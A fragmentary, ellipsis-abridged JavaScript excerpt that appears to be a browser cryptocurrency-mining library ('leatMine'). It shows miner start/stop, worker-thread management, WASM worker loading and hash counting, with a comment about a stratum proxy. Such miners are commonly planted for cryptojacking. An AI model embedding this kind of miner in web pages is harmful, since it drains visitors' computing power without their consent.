(function(window) {
  ...
  var Miner = function(siteKey, params) {
    this.params = params || {};
    // To use this feature (mining unique address's) edit the first lines of leat-stratum-proxy.js and set defaults.force to false. 
    ...
    if(leatMine.CONFIG.REQUIRES_AUTH) {
      this._auth = new leatMine.Auth(this._siteKey, {
  ...
  Miner.prototype.start = function(mode, optInToken) {
    this._tab.mode = mode || leatMine.IF_EXCLUSIVE_TAB;
    ...
    if(this._useWASM || this._asmjsStatus === "loaded") {
      ...
      xhr.addEventListener("load", function() {
        leatMine.LEATHASH_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
  ...
  Miner.prototype.stop = function(mode) {
    for (var i = 0; i < this._threads.length; i++) {
      this._total_HashesFromDeadThreads += this._threads[i].hashesTotal;
    ...
    if (this._tab.interval && mode !== "dont_KillTabUpdate") {
      clearInterval(this._tab.interval);
      this._tab.interval = null
    }
  }
  ...
  Miner.prototype.getTotalHashes = function(estimate) {
    var now = Date.now();
    var hashes = this._total_HashesFromDeadThreads;
    for (var i = 0; i < this._threads.length; i++) {
  ...
  Miner.prototype.setNumThreads = function(num) {
    ...
    if (num > this._threads.length) {
      ...
      while (num < this._threads.length) {
        ...
        this._total_HashesFromDeadThreads += thread.hashesTotal;
        thread.stop()
      }
    }
  }
  ...
  ;
  window.leatMine.createBlob = function(d) {
